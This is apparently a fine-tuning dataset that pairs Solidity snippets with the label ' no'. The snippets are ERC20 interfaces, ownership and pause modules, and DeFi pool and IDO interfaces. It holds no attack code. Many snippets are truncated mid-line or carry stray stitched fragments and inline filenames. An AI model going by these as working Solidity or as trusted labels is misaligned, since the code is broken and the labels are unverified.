{"prompt": "pragma solidity ^0.8.0; \n \ninterface IERA7Card { \n struct ERA7CardEntity { \n uint256 tokenId; \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.8.0; \n \n/** \n * @dev Interface of the ERC20 standard as defined in the EIP. \n */ \ninterface IERC20 { \n /** \n * @dev Returns the amount of tokens in existence. \n */ \n function totalSupply() external view returns (uint256); \n \n /** \n * @dev Returns the amount of tokens owned by `account`. \n */ \n function balanceOf(address account) external view returns (uint256); \n \n /** \n * @dev Moves `amount` tokens from the caller's account to `recipient`. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * Emits a {Transfer} event. \n */ \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n /** \n * @dev Returns the remaining number of tokens that `spender` will be \n * allowed to spend on behalf of `owner` through {transferFrom}. This is \n * zero by default. \n * \n * This value changes when {approve} or {transferFrom} are called. \n */ \n function allowance(address owner, address spender) external view returns (uint256); \n \n /** \n * @dev Sets `amount` as the allowance of `spender` over the caller's tokens. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * IMPORTANT: Beware that changing an allowance with this method brings the risk \n * that someone may use both the old and the new allowance by unfortunate \n * transaction ordering. One possible solution to mitigate this race \n * condition is to first reduce the spender's allowance to 0 and set the \n * desired value afterwards: \n * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 \n * \n * Emits an {Approval} event. \n */ \n function approve(address spender, uint256 amount) external returns (bool); \n \n /** \n * @dev Moves `amount` tokens from `sender` to `recipient` using the \n * allowance mechanism. `amount` is then deducted from the caller's \n * allowance. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * Emits a {Transfer} event. \n */ \n function transferFrom( \n address sender, \n address recipient, \n uint256 amount \n ) external returns (bool); \n \n /** \n * @dev Emitted when `value` tokens are moved from one account (`from`) to \n * another (`to`). \n * \n * Note that `value` may be zero. \n */ \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n /** \n * @dev Emitted when the allowance of a `spender` for an `owner` is set by \n * a call to {approve}. `value` is the new allowance. \n */ \n event Approval(address indexed owner, address indexed spender, uint256 value); \n}\nERC20.sol\n// FECtoken project \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.8.0; \n \nimport \"./ERC20.sol\"; \n \ncontract FECToken is ERC20{ \n \n string public Fecname = \"FECToken\"; \n string public Fecsymbol = \"FEC\"; \n uint8 public dec = 18; \n uint public INITIAL_SUPPLY = 10000000000; \n uint256 public _totalSupply = INITIAL_SUPPLY * (10**uint(dec)); \n \n constructor () ERC20(Fecname, Fecsymbol) public{ \n _mint(msg.sender, _totalSupply); \n } \n} \nIERC20Metadata.sol\n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.8.0; \n \nimport \"./IERC20.sol\"; \n \n/** \n * @dev Interface for the optional metadata functions from the ERC20 standard. \n * \n * _Available since v4.1._ \n */ \ninterface IERC20Metadata is IERC20 { \n /** \n * @dev Returns the name of the token. \n */ \n function name() external view returns (string memory); \n \n /** \n * @dev Returns the symbol of the token. \n */ \n function symbol() external view returns (string memory); \n \n /** \n * @dev Returns the decimals places of the token. \n */ \n function decimals() external view returns (uint8); \n}\n * \n * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks]\n */ \n function _afterTokenTransfer( \n address from, \n address to, \n uint256 amount \n ) internal virtual {} \n} \nContext.sol\n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.8.0; \n \n/* \n * @dev Provides information about the current execution context, including the \n * sender of the transaction and its data. While these are generally available \n * via msg.sender and msg.data, they should not be accessed in such a direct \n * manner, since when dealing with meta-transactions the account sending and \n * paying for execution may not be the actual sender (as far as an application \n * is concerned). \n * \n * This contract is only required for intermediate, library-like contracts. \n */ \nabstract contract Context { \n function _msgSender() internal view virtual returns (address) { \n return msg.sender; \n } \n \n function _msgData() internal view virtual returns (bytes calldata) { \n return msg.data; \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.7.6; \n \ninterface IFidoMember { \n function baseRate() view external returns (uint256); \n \n function fidoOfficial() view external returns (address); \n \n function followers(address, uint256) view external returns (address); \n \n function inviter(address) view external returns (address); \n \n function isInvited(address) view external returns (bool); \n \n function isMember(address) view external returns (bool); \n \n function joinBlockHeight(address) view external returns (uint256); \n \n function mfilPool() view external returns (address); \n \n function multiRate() view external returns (uint256); \n \n function operator() view external returns (address); \n \n function owner() view external returns (address); \n \n function pool() view external returns (address); \n \n function rateDecimal() view external returns (uint256); \n \n function renounceOwnership() external; \n \n function stakeMin() view external returns (uint256); \n \n function transferOwnership(address newOwner) external; \n \n function transferOperatorship(address newOperator) external; \n \n function adjustRate(uint256 _baseRate, uint256 _multiRate) external; \n \n function changeRateDecimal(uint256 newRateDecimal) external; \n \n function changeStakeMin(uint256 newStakeMin) external; \n \n function joinFido(address _inviter) external; \n \n function changeMFILPool(address newMfilpool) external; \n \n function changeFidoOfficial(address newFidoOfficial) external; \n \n function changePool(address newPool) external; \n \n function getFollowerCount(address member) view external returns (uint256); \n \n function caleInviteRate(address member) view external returns (address inviter0, address inviter1, \n \n event AdjustRate(uint256 baseRate, uint256 multiRate); \n \n event AdjustStakeMin(uint256 stakeMin); \n \n event NewMember(address indexed member, address indexed inviter, uint256 joinBlockHeight); \n \n event OperatorshipTransferred(address indexed previousOperator, address indexed newOperator); \n \n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); \n}// SPDX-License-Identifier: MIT \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n/** \n * @dev Interface of the ERC20 standard as defined in the EIP. \n */ \ninterface IERC20Mintable { \n /** \n * @dev Returns the amount of tokens in existence. \n */ \n function totalSupply() external view returns (uint256); \n \n /** \n * @dev Returns the amount of tokens owned by `account`. \n */ \n function balanceOf(address account) external view returns (uint256); \n \n /** \n * @dev Moves `amount` tokens from the caller's account to `recipient`. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * Emits a {Transfer} event. \n */ \n function transfer(address recipient, uint256 amount) \n external \n returns (bool); \n \n /** \n * @dev Returns the remaining number of tokens that `spender` will be \n * allowed to spend on behalf of `owner` through {transferFrom}. This is \n * zero by default. \n * \n * This value changes when {approve} or {transferFrom} are called. \n */ \n function allowance(address owner, address spender) \n external \n view \n returns (uint256); \n \n /** \n * @dev Sets `amount` as the allowance of `spender` over the caller's tokens. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * IMPORTANT: Beware that changing an allowance with this method brings the risk \n * that someone may use both the old and the new allowance by unfortunate \n * transaction ordering. One possible solution to mitigate this race \n * condition is to first reduce the spender's allowance to 0 and set the \n * desired value afterwards: \n * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 \n * \n * Emits an {Approval} event. \n */ \n function approve(address spender, uint256 amount) external returns (bool); \n \n /** \n * @dev Moves `amount` tokens from `sender` to `recipient` using the \n * allowance mechanism. `amount` is then deducted from the caller's \n * allowance. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * Emits a {Transfer} event. \n */ \n function transferFrom( \n address sender, \n address recipient, \n uint256 amount \n ) external returns (bool); \n \n function mint(address recipient, uint256 amount) external; \n \n /** \n * @dev Emitted when `value` tokens are moved from one account (`from`) to \n * another (`to`). \n * \n * Note that `value` may be zero. \n */ \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n /** \n * @dev Emitted when the allowance of a `spender` for an `owner` is set by \n * a call to {approve}. `value` is the new allowance. \n */ \n event Approval( \n address indexed owner, \n address indexed spender, \n uint256 value \n ); \n \n event AddMinter(address indexed minter); \n event RemoveMinter(address indexed minter); \n event Mint( \n address indexed minter, \n address indexed recipient, \n uint256 amount \n ); \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n/** \n * @dev Interface of the ERC20 standard as defined in the EIP. \n */ \ninterface IERC20 { \n /** \n * @dev Returns the amount of tokens in existence. \n */ \n function totalSupply() external view returns (uint256); \n \n /** \n * @dev Returns the amount of tokens owned by `account`. \n */ \n function balanceOf(address account) external view returns (uint256); \n \n /** \n * @dev Moves `amount` tokens from the caller's account to `recipient`. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * Emits a {Transfer} event. \n */ \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n /** \n * @dev Returns the remaining number of tokens that `spender` will be \n * allowed to spend on behalf of `owner` through {transferFrom}. This is \n * zero by default. \n * \n * This value changes when {approve} or {transferFrom} are called. \n */ \n function allowance(address owner, address spender) external view returns (uint256); \n \n /** \n * @dev Sets `amount` as the allowance of `spender` over the caller's tokens. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * IMPORTANT: Beware that changing an allowance with this method brings the risk \n * that someone may use both the old and the new allowance by unfortunate \n * transaction ordering. One possible solution to mitigate this race \n * condition is to first reduce the spender's allowance to 0 and set the \n * desired value afterwards: \n * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 \n * \n * Emits an {Approval} event. \n */ \n function approve(address spender, uint256 amount) external returns (bool); \n \n /** \n * @dev Moves `amount` tokens from `sender` to `recipient` using the \n * allowance mechanism. `amount` is then deducted from the caller's \n * allowance. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * Emits a {Transfer} event. \n */ \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n \n /** \n * @dev Emitted when `value` tokens are moved from one account (`from`) to \n * another (`to`). \n * \n * Note that `value` may be zero. \n */ \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n /** \n * @dev Emitted when the allowance of a `spender` for an `owner` is set by \n * a call to {approve}. `value` is the new allowance. \n */ \n event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.7.6; \ninterface IMdexPair { \n event Approval(address indexed owner, address indexed spender, uint value); \n event Transfer(address indexed from, address indexed to, uint value); \n \n function name() external pure returns (string memory); \n \n function symbol() external pure returns (string memory); \n \n function decimals() external pure returns (uint8); \n \n function totalSupply() external view returns (uint); \n \n function balanceOf(address owner) external view returns (uint); \n \n function allowance(address owner, address spender) external view returns (uint); \n \n function approve(address spender, uint value) external returns (bool); \n \n function transfer(address to, uint value) external returns (bool); \n \n function transferFrom(address from, address to, uint value) external returns (bool); \n \n function DOMAIN_SEPARATOR() external view returns (bytes32); \n \n function PERMIT_TYPEHASH() external pure returns (bytes32); \n \n function nonces(address owner) external view returns (uint); \n \n function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, by\n \n event Mint(address indexed sender, uint amount0, uint amount1); \n event Burn(address indexed sender, uint amount0, uint amount1, address indexed to); \n event Swap( \n address indexed sender, \n uint amount0In, \n uint amount1In, \n uint amount0Out, \n uint amount1Out, \n address indexed to \n ); \n event Sync(uint112 reserve0, uint112 reserve1); \n \n function MINIMUM_LIQUIDITY() external pure returns (uint); \n \n function factory() external view returns (address); \n \n function token0() external view returns (address); \n \n function token1() external view returns (address); \n \n function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTim\n \n function price0CumulativeLast() external view returns (uint); \n \n function price1CumulativeLast() external view returns (uint); \n \n function kLast() external view returns (uint); \n \n function mint(address to) external returns (uint liquidity); \n \n function burn(address to) external returns (uint amount0, uint amount1); \n \n function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external; \n \n function skim(address to) external; \n \n function sync() external; \n \n function price(address token, uint256 baseDecimal) external view returns (uint256); \n \n function initialize(address, address) external; \n}// SPDX-License-Identifier: MIT \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.7.6; \n \ninterface IRateOracle { \n function owner() view external returns (address); \n \n function paused() view external returns (bool); \n \n function renounceOwnership() external; \n \n function requester() view external returns (address); \n \n function transferOwnership(address newOwner) external; \n \n function updater() view external returns (address); \n \n function pause() external; \n \n function unPause() external; \n \n function status() view external returns (bool); \n \n function lastRequestTime() view external returns (uint256); \n \n function lastUpdateTime() view external returns (uint256); \n \n function decimals() view external returns (uint8); \n \n function rate() view external returns (uint256); \n \n function request() external; \n \n function update(uint256 rate_) external; \n \n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); \n \n event Paused(address account); \n \n event Request(uint256 indexed timestamp); \n \n event RequestershipTransferred(address indexed previousRequester, address indexed newRequester); \n \n event Unpaused(address account); \n \n event Update(uint256 indexed timestamp, uint256 rate); \n \n event UpdatershipTransferred(address indexed previousUpdater, address indexed newUpdater); \n}// SPDX-License-Identifier: MIT \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.7.6; \n \ninterface IMFIL { \n function allowance(address owner, address spender) view external returns (uint256); \n \n function approve(address spender, uint256 amount) external returns (bool); \n \n function balanceOf(address account) view external returns (uint256); \n \n function burn(uint256 amount) external; \n \n function burnFrom(address account, uint256 amount) external; \n \n function decimals() view external returns (uint8); \n \n function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool); \n \n function increaseAllowance(address spender, uint256 addedValue) external returns (bool); \n \n function isMinter(address) view external returns (bool); \n \n function mint(address recipient, uint256 amount) external; \n \n function name() view external returns (string memory); \n \n function operator() view external returns (address); \n \n function owner() view external returns (address); \n \n function paused() view external returns (bool); \n \n function renounceOwnership() external; \n \n function symbol() view external returns (string memory); \n \n function totalSupply() view external returns (uint256); \n \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n function transferOwnership(address newOwner) external; \n \n function transferOperatorship(address newOperator) external; \n \n function pause() external; \n \n function unPause() external; \n \n function addMinter(address minter) external; \n \n function removeMinter(address minter) external; \n \n function cap() view external returns (uint256); \n \n event AddMinter(address indexed minter); \n \n event Approval(address indexed owner, address indexed spender, uint256 value); \n \n event Mint(address indexed minter, address indexed recipient, uint256 amount); \n \n event OperatorshipTransferred(address indexed previousOperator, address indexed newOperator); \n \n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); \n \n event Paused(address account); \n \n event RemoveMinter(address indexed minter); \n \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n event Unpaused(address account); \n}// SPDX-License-Identifier: MIT \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.7.6; \n \ninterface IIDOToken { \n function allowance(address owner, address spender) view external returns (uint256); \n \n function approve(address spender, uint256 amount) external returns (bool); \n \n function balanceOf(address account) view external returns (uint256); \n \n function burn(uint256 amount) external; \n \n function burnFrom(address account, uint256 amount) external; \n \n function dailySaleCap() view external returns (uint256); \n \n function decimals() view external returns (uint8); \n \n function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool); \n \n function factory() view external returns (address); \n \n function gasPrice() view external returns (uint256); \n \n function hardDrivePrice() view external returns (uint256); \n \n function hfil() view external returns (address); \n \n function hfilRecipient() view external returns (address); \n \n function idoEndTime() view external returns (uint256); \n \n function idoStartTime() view external returns (uint256); \n \n function idoStatus() view external returns (bool); \n \n function increaseAllowance(address spender, uint256 addedValue) external returns (bool); \n \n function name() view external returns (string memory); \n \n function node() view external returns (string memory); \n \n function paused() view external returns (bool); \n \n function price() view external returns (uint256); \n \n function router() view external returns (address); \n \n function sealPrice() view external returns (uint256); \n \n function sender() view external returns (address); \n \n function symbol() view external returns (string memory); \n \n function todayStartTime() view external returns (uint256); \n \n function totalSupply() view external returns (uint256); \n \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n function operator() view external returns (address); \n \n function setPrice(uint256 gasPrice_, uint256 sealPrice_, uint256 hardDrivePrice_) external; \n \n function setTimes(uint256 idoStartTime_, uint256 idoEndTime_) external; \n \n function changerouter(address _router) external; \n \n function stopIdo() external; \n \n function stopIdoBySender() external; \n \n function todayRemaind() view external returns (uint256); \n \n function pause() external; \n \n function unPause() external; \n \n function cap() view external returns (uint256); \n \n function startIdo(address _router) external; \n \n function ido(address recipient) external returns (uint256 amount); \n \n event Approval(address indexed owner, address indexed spender, uint256 value); \n \n event IDO(address indexed to, uint256 cost, uint256 amount); \n \n event IDOStart(uint256 timestamp); \n \n event IDOStop(uint256 timestamp, address sender); \n \n event Paused(address account); \n \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n event Unpaused(address account); \n}// SPDX-License-Identifier: MIT \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.7.6; \n \ninterface IHFIL { \n function allowance(address owner, address spender) view external returns (uint256); \n \n function approve(address spender, uint256 amount) external returns (bool); \n \n function balanceOf(address account) view external returns (uint256); \n \n function burn(address account, uint256 amount) external; \n \n function changeUser(address new_operator, address new_pauser) external; \n \n function decimals() view external returns (uint8); \n \n function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool); \n \n function increaseAllowance(address spender, uint256 addedValue) external returns (bool); \n \n function mint(address account, uint256 amount) external; \n \n function name() view external returns (string memory); \n \n function pause() external; \n \n function paused() view external returns (bool); \n \n function symbol() view external returns (string memory); \n \n function totalSupply() view external returns (uint256); \n \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n function unpause() external; \n \n event Approval(address indexed owner, address indexed spender, uint256 value); \n \n event Paused(address account); \n \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n event Unpaused(address account); \n}// SPDX-License-Identifier: MIT \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.7.6; \n \ninterface IFidoUsdtLPPool { \n function BlastUpdateBlock() view external returns (uint256); \n \n function BrewardPreBlock() view external returns (uint256); \n \n function BrewardRate() view external returns (uint256); \n \n function BuserRate(address) view external returns (uint256); \n \n function BuserReward(address) view external returns (uint256); \n \n function adjustReward(uint256 amount) external; \n \n function caleLiquidity(uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin, uint256 \n \n function caleReward() view external returns (uint256 reward); \n \n function factory() view external returns (address); \n \n function fido() view external returns (address); \n \n function getStake() view external returns (uint256 amount); \n \n function halve() external returns (uint256 reward); \n \n function operator() view external returns (address); \n \n function owner() view external returns (address); \n \n function pairFor(address tokenA, address tokenB) view external returns (address pair); \n \n function pause() external; \n \n function paused() view external returns (bool); \n \n function renounceOwnership() external; \n \n function rewardToken() view external returns (address); \n \n function stake(uint256 amountAIn, uint256 amountBIn) external returns (uint256 amountA, uint256 amo\n \n function stakeRate() view external returns (uint8); \n \n function tokenA() view external returns (address); \n \n function tokenB() view external returns (address); \n \n function totalStake() view external returns (uint256); \n \n function totalTokenBStake() view external returns (uint256); \n \n function transferOperatorship(address newOperator) external; \n \n function transferOwnership(address newOwner) external; \n \n function unPause() external; \n \n function unStake() external returns (uint256 reward, uint256 amountA, uint256 amountB, uint256 liqu\n \n function usdt() view external returns (address); \n \n function userStake(address) view external returns (uint256); \n \n function userTokenBStake(address) view external returns (uint256); \n \n event NewReward(uint256 blockHeight, uint256 amount); \n \n event OperatorshipTransferred(address indexed previousOperator, address indexed newOperator); \n \n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); \n \n event Paused(address account); \n \n event Reward(address indexed receiver, uint256 reward); \n \n event Stake(address indexed sender, uint256 amountA, uint256 amountB, uint256 liquidity); \n \n event UnStake(address indexed receiver, uint256 amountA, uint256 amountB, uint256 liquidity); \n \n event Unpaused(address account); \n}// SPDX-License-Identifier: MIT \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.7.6; \n \ninterface IMdexFactory { \n event PairCreated(address indexed token0, address indexed token1, address pair, uint); \n \n function feeTo() external view returns (address); \n \n function feeToSetter() external view returns (address); \n \n function feeToRate() external view returns (uint256); \n \n function initCodeHash() external view returns (bytes32); \n \n function getPair(address tokenA, address tokenB) external view returns (address pair); \n \n function allPairs(uint) external view returns (address pair); \n \n function allPairsLength() external view returns (uint); \n \n function createPair(address tokenA, address tokenB) external returns (address pair); \n \n function setFeeTo(address) external; \n \n function setFeeToSetter(address) external; \n \n function setFeeToRate(uint256) external; \n \n function setInitCodeHash(bytes32) external; \n \n function sortTokens(address tokenA, address tokenB) external pure returns (address token0, addres\n \n function pairFor(address tokenA, address tokenB) external view returns (address pair); \n \n function getReserves(address tokenA, address tokenB) external view returns (uint256 reserveA, uin\n \n function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) external pure returns (uint25\n \n function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) external view retu\n \n function getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) external view retu\n \n function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[\n \n function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[\n}// SPDX-License-Identifier: MIT \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.7.6; \n \ninterface IIDOInfo { \n function IDOList(uint256) view external returns (address); \n \n function exist(address) view external returns (bool); \n \n function isPool(address) view external returns (bool); \n \n function operator() view external returns (address); \n \n function owner() view external returns (address); \n \n function payer2pool(address) view external returns (address); \n \n function pool2idoToken(address) view external returns (address); \n \n function renounceOwnership() external; \n \n function stakeAddress(address) view external returns (address); \n \n function transferOwnership(address newOwner) external; \n \n function transferOperatorship(address newOperator) external; \n \n function IDOListCount() view external returns (uint256); \n \n function addIDO(address idoToken) external; \n \n function setPayer(address pool, address payer) external; \n \n function setStakeAddress(address idoToken, address _stakeAddress) external; \n \n event AddIDO(uint256 timestamp, address idoToken); \n \n event OperatorshipTransferred(address indexed previousOperator, address indexed newOperator); \n \n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); \n \n event SetPayer(uint256 timestamp, address pool, address payer); \n \n event SetStakeAddress(uint256 timestamp, address idoToken, address _stakeAddress); \n}// SPDX-License-Identifier: MIT \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.9.0; \n \ncontract Migrations { \n address public owner = msg.sender; \n uint public last_completed_migration; \n \n modifier restricted() { \n require( \n msg.sender == owner, \n \"This function is restricted to the contract's owner\" \n ); \n _; \n } \n \n function setCompleted(uint completed) public restricted { \n last_completed_migration = completed; \n } \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.7.6; \n \nimport \"./StakeLPRewardPerBlock.sol\"; \n \ncontract FidoUsdtLPPool is StakeLPRewardPerBlock { \n \n address public usdt; \n address public fido; \n constructor( \n address _facotry, \n address _operator, \n address _usdt, \n address _fido \n ) StakeLPRewardPerBlock(_facotry, _operator, _usdt, _fido, _fido) { \n usdt = _usdt; \n fido = _fido; \n } \n \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.7.6; \n \nimport \"./ERC20/ERC20.sol\"; \nimport \"./ERC20/ERC20Burnable.sol\"; \nimport \"./ERC20/ERC20Mintable.sol\"; \nimport \"./ERC20/ERC20Pausable.sol\"; \nimport \"./Ownable.sol\"; \n \ncontract MFIL is ERC20Mintable, ERC20Burnable, Ownable { \n using SafeMath for uint256; \n \n address public operator; \n uint256 private _cap = 2000000000 * 10**18; \n \n event OperatorshipTransferred( \n address indexed previousOperator, \n address indexed newOperator \n ); \n \n constructor(address _operator) \n ERC20(\"Mirror FileCoin\", \"MFIL\") \n Pausable() \n Ownable() \n { \n operator = _operator; \n emit OperatorshipTransferred(address(0), operator); \n _setupDecimals(18); \n } \n \n modifier onlyOperator() { \n require( \n _msgSender() == operator, \n \"Operable: caller is not the operator\" \n ); \n _; \n } \n \n function transferOperatorship(address newOperator) external onlyOwner { \n require( \n newOperator != address(0), \n \"Operable: new operator is the zero address\" \n ); \n emit OperatorshipTransferred(operator, newOperator); \n operator = newOperator; \n } \n \n function pause() external onlyOperator { \n _pause(); \n } \n \n function unPause() external onlyOperator { \n _unpause(); \n } \n \n function addMinter(address minter) external onlyOperator { \n _addMinter(minter); \n } \n \n function removeMinter(address minter) external onlyOperator { \n _removeMinter(minter); \n } \n \n /** \n * @dev Returns the cap on the token's total supply. \n */ \n function cap() public view virtual returns (uint256) { \n return _cap; \n } \n \n /** \n * @dev See {ERC20-_beforeTokenTransfer}. \n * \n * Requirements: \n * \n * - minted tokens must not cause the total supply to go over the cap. \n */ \n function _beforeTokenTransfer( \n address from, \n address to, \n uint256 amount \n ) internal virtual override { \n super._beforeTokenTransfer(from, to, amount); \n \n if (from == address(0)) { \n // When minting tokens \n require(totalSupply().add(amount) <= cap(), \"ERC20: cap exceeded\"); \n } \n } \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \nimport \"./Context.sol\"; \n/** \n * @dev Contract module which provides a basic access control mechanism, where \n * there is an account (an owner) that can be granted exclusive access to \n * specific functions. \n * \n * By default, the owner account will be the one that deploys the contract. This \n * can later be changed with {transferOwnership}. \n * \n * This module is used through inheritance. It will make available the modifier \n * `onlyOwner`, which can be applied to your functions to restrict their use to \n * the owner. \n */ \nabstract contract Ownable is Context { \n address private _owner; \n \n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); \n \n /** \n * @dev Initializes the contract setting the deployer as the initial owner. \n */ \n constructor () { \n address msgSender = _msgSender(); \n _owner = msgSender; \n emit OwnershipTransferred(address(0), msgSender); \n } \n \n function _initOwner(address owner_) internal { \n require(owner_ != address(0), \"Ownable: owner cannot be init to zero address\"); \n _owner = owner_; \n emit OwnershipTransferred(address(0), _owner); \n } \n \n /** \n * @dev Returns the address of the current owner. \n */ \n function owner() public view virtual returns (address) { \n return _owner; \n } \n \n /** \n * @dev Throws if called by any account other than the owner. \n */ \n modifier onlyOwner() { \n require(owner() == _msgSender(), \"Ownable: caller is not the owner\"); \n _; \n } \n \n /** \n * @dev Leaves the contract without owner. It will not be possible to call \n * `onlyOwner` functions anymore. Can only be called by the current owner. \n * \n * NOTE: Renouncing ownership will leave the contract without an owner, \n * thereby removing any functionality that is only available to the owner. \n */ \n function renounceOwnership() public virtual onlyOwner { \n emit OwnershipTransferred(_owner, address(0)); \n _owner = address(0); \n } \n \n /** \n * @dev Transfers ownership of the contract to a new account (`newOwner`). \n * Can only be called by the current owner. \n */ \n function transferOwnership(address newOwner) public virtual onlyOwner { \n require(newOwner != address(0), \"Ownable: new owner is the zero address\"); \n emit OwnershipTransferred(_owner, newOwner); \n _owner = newOwner; \n } \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n/* \n * @dev Provides information about the current execution context, including the \n * sender of the transaction and its data. While these are generally available \n * via msg.sender and msg.data, they should not be accessed in such a direct \n * manner, since when dealing with GSN meta-transactions the account sending and \n * paying for execution may not be the actual sender (as far as an application \n * is concerned). \n * \n * This contract is only required for intermediate, library-like contracts. \n */ \nabstract contract Context { \n function _msgSender() internal view virtual returns (address payable) { \n return msg.sender; \n } \n \n function _msgData() internal view virtual returns (bytes memory) { \n this; // silence state mutability warning without generating bytecode - see https://github.co\n return msg.data; \n } \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.7.6; \n// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return t\nlibrary TransferHelper { \n function safeApprove(address token, address to, uint value) internal { \n // bytes4(keccak256(bytes('approve(address,uint256)'))); \n (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value))\n require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_F\n } \n \n function safeTransfer(address token, address to, uint value) internal { \n // bytes4(keccak256(bytes('transfer(address,uint256)'))); \n (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value))\n require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_\n } \n \n function safeTransferFrom(address token, address from, address to, uint value) internal { \n // bytes4(keccak256(bytes('transferFrom(address,address,uint256)'))); \n (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, v\n require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_\n } \n \n function safeTransferETH(address to, uint value) internal { \n (bool success,) = to.call{value : value}(new bytes(0)); \n require(success, 'TransferHelper: ETH_TRANSFER_FAILED'); \n } \n}// SPDX-License-Identifier: MIT \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \nimport \"./Context.sol\"; \n \n/** \n * @dev Contract module which allows children to implement an emergency stop \n * mechanism that can be triggered by an authorized account. \n * \n * This module is used through inheritance. It will make available the \n * modifiers `whenNotPaused` and `whenPaused`, which can be applied to \n * the functions of your contract. Note that they will not be pausable by \n * simply including this module, only once the modifiers are put in place. \n */ \nabstract contract Pausable is Context { \n /** \n * @dev Emitted when the pause is triggered by `account`. \n */ \n event Paused(address account); \n \n /** \n * @dev Emitted when the pause is lifted by `account`. \n */ \n event Unpaused(address account); \n \n bool private _paused; \n \n /** \n * @dev Initializes the contract in unpaused state. \n */ \n constructor () { \n _paused = false; \n } \n \n /** \n * @dev Returns true if the contract is paused, and false otherwise. \n */ \n function paused() public view virtual returns (bool) { \n return _paused; \n } \n \n /** \n * @dev Modifier to make a function callable only when the contract is not paused. \n * \n * Requirements: \n * \n * - The contract must not be paused. \n */ \n modifier whenNotPaused() { \n require(!paused(), \"Pausable: paused\"); \n _; \n } \n \n /** \n * @dev Modifier to make a function callable only when the contract is paused. \n * \n * Requirements: \n * \n * - The contract must be paused. \n */ \n modifier whenPaused() { \n require(paused(), \"Pausable: not paused\"); \n _; \n } 